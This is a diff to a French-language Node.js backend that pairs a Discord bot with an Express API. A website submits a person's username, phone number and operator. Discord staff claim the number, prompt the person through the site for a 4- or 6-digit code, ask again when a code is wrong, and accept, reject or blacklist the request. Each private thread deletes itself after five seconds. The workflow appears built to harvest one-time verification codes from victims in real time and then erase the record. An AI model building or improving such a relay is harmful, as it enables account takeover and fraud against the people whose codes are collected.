@@ -4,8 +4,7 @@ const cors = require('cors');
 const { v4: uuidv4 } = require('uuid');
 
 const DISCORD_TOKEN    = process.env.DISCORD_TOKEN    || 'TON_TOKEN_ICI';
-// ⚠️ TON NOUVEAU SALON EST ICI :
-const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1570890792745304245'; 
+const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1570890792745304245';
 
 const demandes = new Map();
 
@@ -34,7 +33,7 @@ client.on('interactionCreate', async (interaction) => {
 
   if (!demande) return interaction.reply({ content: 'Ce dossier est terminé ou n\'existe plus.', ephemeral: true });
 
-  // ── 1. PRENDRE LE NUMÉRO (Crée le fil privé) ──
+  // ── 1. PRENDRE LE NUMÉRO ──
   if (action === 'claim') {
     if (demande.claimed) return interaction.reply({ content: '❌ Trop tard, ce numéro a déjà été pris !', ephemeral: true });
 
@@ -42,14 +41,12 @@ client.on('interactionCreate', async (interaction) => {
     demande.claimedBy = interaction.user.id;
     demandes.set(demandeId, demande);
 
-    // Désactiver le bouton public
     await interaction.update({
       content: `⚡ **Nouveau numéro disponible : ${demande.operator}**\n✅ *Ce numéro a été pris par ${interaction.user}*`,
       embeds: [],
       components: []
     });
 
-    // Création du fil privé
     const thread = await interaction.channel.threads.create({
       name: `📁 Dossier - @${demande.username}`,
       type: ChannelType.PrivateThread,
@@ -87,7 +84,7 @@ client.on('interactionCreate', async (interaction) => {
     return interaction.followUp({ content: `✅ Dossier déplacé dans ton fil privé : ${thread}`, ephemeral: true });
   }
 
-  // ── 2. COPIER LE NUMÉRO (Uniquement le numéro) ──
+  // ── 2. COPIER LE NUMÉRO ──
   if (action === 'copynum') {
     return interaction.reply({ content: `${demande.phone.replace(/\s/g, '')}`, ephemeral: true });
   }
@@ -95,9 +92,12 @@ client.on('interactionCreate', async (interaction) => {
   // ── 3. DEMANDER LE CODE (4 ou 6) ──
   if (action === 'setcode') {
     const length = parseInt(args[1]);
-    demande.codeLength = length;
-    demande.waitingForCode = true;
-    demandes.set(demandeId, demande);
+    const demId = args[2]; // On récupère l'ID correctement ici
+    const dem = demandes.get(demId);
+    
+    dem.codeLength = length;
+    dem.waitingForCode = true;
+    demandes.set(demId, dem);
 
     await interaction.update({
       content: `⏳ **Demande envoyée au client (Code à ${length} chiffres). En attente de sa saisie...**`,
@@ -106,7 +106,7 @@ client.on('interactionCreate', async (interaction) => {
     });
   }
 
-  // ── 4. MAUVAIS CODE (Redemander) ──
+  // ── 4. MAUVAIS CODE ──
   if (action === 'badcode') {
     demande.waitingForCode = true;
     demandes.set(demandeId, demande);
@@ -117,16 +117,12 @@ client.on('interactionCreate', async (interaction) => {
     });
   }
 
-  // ── 5. VALIDER & SUPPRIMER LE FIL ──
+  // ── 5. VALIDER ──
   if (action === 'accept') {
     demande.status = 'accepted';
     demandes.set(demandeId, demande);
-    
     await interaction.update({ content: `✅ **Dossier approuvé avec succès.**\n*(Ce fil sera supprimé dans 5 secondes...)*`, embeds: [], components: [] });
-    
-    setTimeout(() => {
-      if (interaction.channel) interaction.channel.delete().catch(() => {});
-    }, 5000);
+    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
   }
   
   // ── 6. REJETER / BLACKLIST ──
@@ -134,10 +130,7 @@ client.on('interactionCreate', async (interaction) => {
     demande.status = action === 'reject' ? 'rejected' : 'blacklisted';
     demandes.set(demandeId, demande);
     await interaction.update({ content: `❌ **Dossier rejeté.**\n*(Ce fil sera supprimé dans 5 secondes...)*`, embeds: [], components: [] });
-    
-    setTimeout(() => {
-      if (interaction.channel) interaction.channel.delete().catch(() => {});
-    }, 5000);
+    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
   }
 });
 
@@ -148,12 +141,10 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// 1. Nouvelle demande
 app.post('/api/demande', async (req, res) => {
   try {
     const { username, phone, operator } = req.body;
     const id = uuidv4();
-    
     let formattedPhone = phone;
     if(phone.length === 10) formattedPhone = `${phone.slice(0,2)} ${phone.slice(2,4)} ${phone.slice(4,6)} ${phone.slice(6,8)} ${phone.slice(8,10)}`;
 
@@ -188,7 +179,6 @@ app.post('/api/demande', async (req, res) => {
   }
 });
 
-// 2. Statut du site
 app.get('/api/demande/:id/status', (req, res) => {
   const demande = demandes.get(req.params.id);
   if (!demande) return res.status(404).json({ error: 'Introuvable' });
@@ -196,7 +186,6 @@ app.get('/api/demande/:id/status', (req, res) => {
   res.json({ status: demande.status, waitingForCode: demande.waitingForCode });
 });
 
-// 3. Code reçu depuis le site
 app.post('/api/demande/:id/code', async (req, res) => {
   try {
     const { code } = req.body;
